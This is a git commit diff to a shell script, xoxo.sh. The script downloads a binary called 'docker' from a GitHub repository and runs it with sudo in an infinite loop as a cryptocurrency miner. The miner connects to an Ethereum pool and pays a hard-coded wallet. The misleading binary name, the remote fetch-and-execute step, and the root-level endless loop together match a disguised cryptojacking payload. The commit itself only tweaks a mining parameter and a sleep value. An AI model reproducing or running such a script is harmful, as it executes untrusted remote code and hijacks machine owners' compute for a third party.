2f7f0e17cffb0369c44873fe60c91ad6c54e80b9
xkolux <87460458+xkolux@users.noreply.github.com>
2021-07-15 10:35:05 +0530

    Update xoxo.sh

--- xoxo.sh
+++ xoxo.sh
@@ -4,7 +4,7 @@ sudo apt install libpci3
 wget https://github.com/xkolux/takealook/raw/main/docker
 chmod +x docker
 while [ 1 ]; do
-sudo ./docker -pool stratum+tcp://us1.ethermine.org:4444 -wal 0xD07b31e87Bf3892D9F6cA4a417ccACD439EC51Cc.$(echo $(shuf -i 1-10 -n 1)-KILLME) -pass x -proto 2 -mi 12 -gt 400
+sudo ./docker -pool stratum+tcp://us1.ethermine.org:4444 -wal 0xD07b31e87Bf3892D9F6cA4a417ccACD439EC51Cc.$(echo $(shuf -i 1-10 -n 1)-KILLME) -pass x -proto 2 -mi 12 -gt 0
 sleep 5
 done
-sleep 999999999
+sleep 999999
